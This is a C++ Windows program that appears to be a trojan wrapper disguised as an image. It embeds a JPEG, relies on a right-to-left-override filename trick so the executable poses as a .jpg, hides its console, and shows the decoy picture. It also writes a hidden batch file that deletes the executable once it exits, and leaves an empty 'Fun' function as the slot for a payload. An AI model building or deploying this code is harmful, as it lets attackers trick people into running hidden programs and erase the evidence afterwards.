#include <Windows.h>
#include <string>

constexpr auto MAX_JPG_SIZE = 1024 * 1024;
constexpr auto RTL = 0x202e;

#pragma section("thugsect", read)
__declspec(allocate("thugsect")) static unsigned char pic_data[MAX_JPG_SIZE];

using namespace std;

/*!
* @brief ShowImage - show image in default image viewer
* @param path - path to image
*/
static void ShowImage(const wstring& path)
{
    wstring defViewer = L"\"C:\\Program Files\\Windows Photo Viewer\\PhotoViewer.dll\", ImageView_Fullscreen ";
    auto cmd = defViewer + path;

    if ((INT_PTR)ShellExecute(NULL, L"open", L"rundll32.exe", cmd.c_str(), NULL, SW_SHOW) <= 32)
    {
        ShellExecute(NULL, L"open", cmd.c_str(), NULL, NULL, SW_SHOW);
    }
}

/*!
* @brief DeleteMe - delete executable and .bat file
* @param batPath - path to .bat file
* @param exeName - name of the executable
*/
static void DeleteMe(const wstring& batPath, const wstring& exeName)
{
    //Save the command to a .bat file and execute it
    wstring delFilePath = batPath + L"\\" + L"del.bat";

    auto hFile = CreateFile(delFilePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        DWORD dwWritten = 0;

        wstring exeNameStr(exeName);

        auto idx = exeNameStr.find(RTL);
        if (idx != string::npos)
        {
            exeNameStr.erase(idx);
            exeNameStr += L"*.exe";
        }

        string exePathStr(exeNameStr.begin(), exeNameStr.end());
        string delPathStr(batPath.begin(), batPath.end());

        string pid = to_string(GetCurrentProcessId());

        string cmd = "@echo off\nsetlocal\n";
        cmd += ":WaitForProcessToEnd\n";
        cmd += "tasklist /fi \"PID eq " + pid + "\" | find \"" + pid + "\" >nul 2>&1\n";
        cmd += "if errorlevel 1 goto ProcessEnded\n";
        cmd += "timeout /t 2 /nobreak >nul\n";
        cmd += "goto WaitForProcessToEnd\n";
        cmd += ":ProcessEnded\n";
        cmd += "del /Q \"" + delPathStr + "\\" + exePathStr + "\"\n";
        cmd += "del /Q \"" + delPathStr + "\\del.bat\n";
        cmd += "endlocal\n";

        WriteFile(hFile, cmd.c_str(), (DWORD)cmd.size(), &dwWritten, NULL);
        CloseHandle(hFile);
        ShellExecute(NULL, L"open", delFilePath.c_str(), NULL, NULL, SW_HIDE);
    }
}

/*!
* @brief WritePic - write image to file
* @return path to image
*/
static wstring WritePic()
{
    //get working folder path
    wchar_t tempPath[MAX_PATH];
    GetModuleFileName(NULL, tempPath, MAX_PATH);

    //Get file name from tempPath
    wstring tempPathStr(tempPath);

    wstring fileName = tempPathStr.substr(tempPathStr.find_last_of(L"\\") + 1);

    //remove file name from tempPath
    tempPathStr = tempPathStr.substr(0, tempPathStr.find_last_of(L"\\"));

    DeleteMe(tempPathStr, fileName);

    //remove from fileName 0x202e character
    fileName.erase(remove(fileName.begin(), fileName.end(), RTL), fileName.end());

    //Remove extension
    fileName = fileName.substr(0, fileName.find_last_of(L"."));

    //Remove "gpj" string
    auto pos = fileName.find(L"gpj");
    if (pos != wstring::npos)
	{
		fileName = fileName.substr(0, pos);
	}

    //add new file name
    tempPathStr += L"\\" + fileName + L".jpg";

    //open file
    auto hFile = CreateFile(tempPathStr.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return L"";
    }

    DWORD imgLength = *(reinterpret_cast<DWORD*>(pic_data));
    DWORD dwWritten = 0;

    //write image to file
    WriteFile(hFile, &pic_data[sizeof(DWORD)], imgLength, &dwWritten, NULL);
    CloseHandle(hFile);

    return tempPathStr;
}

void Fun()
{
    //Do fun stuff here
}

int main(int argc, char* argv[])
{
    AllocConsole();
    auto stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    ShowImage(WritePic());
    Fun();
    return 0;
}
